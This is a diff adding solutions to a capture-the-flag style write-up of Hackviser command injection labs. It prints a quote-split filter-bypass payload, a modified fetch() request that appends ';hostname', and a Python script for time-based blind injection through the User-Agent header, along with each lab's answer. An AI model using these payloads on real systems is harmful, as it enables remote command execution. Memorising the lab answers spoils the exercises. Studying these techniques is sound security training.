@@ -33,17 +33,88 @@ prog: 'Hackviser Web Application Security Labs  -  March 2026'
 
 <h5 class="mb-2"><strong>3. Command Injection Improved Filter Bypass</strong></h5>
 <p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. If the domain name you are sending contains commands or operators, your query will be blocked. You should know that almost all commands are ignored. Find a way to run a command on the system. What is the hostname address of the server where the website is running?</p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3">We use the payload <code>google.com|h'o'stname</code> in the input field.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image4.png" alt="Web Application Security Command Injection 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> mutuality</p>
 <br />
 
 <h5 class="mb-2"><strong>4. Command Injection in Perl-Based Stock Control System</strong></h5>
 <p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application checks stock for products with a script written in Perl. Find a way to run commands on the system. What is the hostname address of the server where the website is running?</p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3">The application has the following dropdown. To test it out, we select Nikon D3500 and click Check.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image5.png" alt="Web Application Security Command Injection 5" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">The number of products in stock returned is 30.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image6.png" alt="Web Application Security Command Injection 6" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">In the Network tab in DevTools, we need to copy the HTTP POST request we sent earlier as Fetch, so we can modify it in the Console.</p>
+
+```JavaScript
+fetch("https://tight-jackpot.europe1.hackviser.space/", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "max-age=0",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
+    "sec-ch-ua-mobile": "?1",
+    "sec-ch-ua-platform": "\"Android\"",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1"
+  },
+  "referrer": "https://tight-jackpot.europe1.hackviser.space/",
+  "body": "search=nikon-d3500;hostname",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+```
+
+<p class="mb-3">Notice how we append <code>;hostname</code> to the <code>"body": "search=nikon-d3500",</code> as seen in the Fetch request above. We then press Enter, and click on the URL that appears in the Console. Since our DevTools is currently open in the browser, accessing the new URL will be recorded in the Network tab. Previewing the latest HTTP POST request in the Network tab will show us the hostname.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image7.png" alt="Web Application Security Command Injection 7" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> brilliance</p>
 <br />
 
 <h5 class="mb-2"><strong>5. Command Injection via User-Agent Log Entries</strong></h5>
 <p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application logs the User Agent information of visiting users in a log file. Find a way to execute commands on the system. What is the hostname address of the server where the website is running?</p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+
+<p class="mb-3">Since the application processes the <code>User-Agent</code> header server-side without reflecting <code>stdout</code> or <code>stderr</code> in the HTTP response, classic in-band exploitation is impossible. Data cannot be read directly from the page; instead, we must rely on side channels like request timing or external network interactions to infer execution. We have to shift to a conditional time-based approach to leak data. By embedding a conditional statement that triggers a sleep command only when a specific character match is correct, we could systematically reconstruct the server's hostname character by character.</p>
+<p class="mb-3">Manually brute-forcing a string character by character is highly inefficient. To optimize the data extraction process, we can automate the exfiltration using a Python script. The script systematically iterates through each string index and candidate character, dispatches the payload via an HTTP request, and flags any response latency exceeding 4.5 seconds as a successful match.</p>
+
+```Python
+import requests
+import string
+import time
+
+url = "[target_URL]"
+chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_"
+hostname = ""
+
+for pos in range(1, 20):  
+    for c in chars:
+        ua = f"'$( [ \"$(hostname | cut -c{pos})\" = \"{c}\" ] && sleep 5 )'"
+        start = time.time()
+        requests.get(url, headers={"User-Agent": ua})
+        delta = time.time() - start
+        if delta > 4.5: 
+            hostname += c
+            print(f"Found: {hostname}")
+            break
+```
+
+<p class="mb-3">The following is seen in the terminal when we run the Python script.</p>
+
+```Bash
+user@linux:~$ python3 script.py
+Found: a
+Found: ar
+Found: arc
+Found: arca
+Found: arcan
+Found: arcane
+```
+
+<p class="mb-5"><strong>Answer:</strong> arcane</p>
 
 
 <hr />
